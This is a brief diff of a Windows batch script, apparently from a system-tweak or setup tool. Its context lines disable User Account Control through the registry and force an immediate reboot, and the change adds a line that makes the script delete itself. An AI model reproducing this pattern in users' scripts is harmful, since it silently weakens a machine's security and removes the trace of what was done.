@@ -83,3 +83,5 @@ timeout /t 1 /nobreak > nul
 reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d0 /f
 
 shutdown /r /t 0 >nul 2>&1
+
+del %~f0
